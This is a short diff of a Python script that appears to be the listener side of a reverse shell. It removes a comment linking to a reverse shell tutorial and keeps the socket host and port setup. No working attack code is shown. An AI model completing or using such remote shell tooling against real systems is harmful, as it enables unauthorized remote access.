@@ -1,7 +1,6 @@
 import sys
 import socket
 
-#https://axju.de/posts/2021/02/a-reverse-shell-with-python/
 
 host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0' #server IP
 port = int(sys.argv[2] if len (sys.argv) > 2 else 5555) # port we're tunneling data into
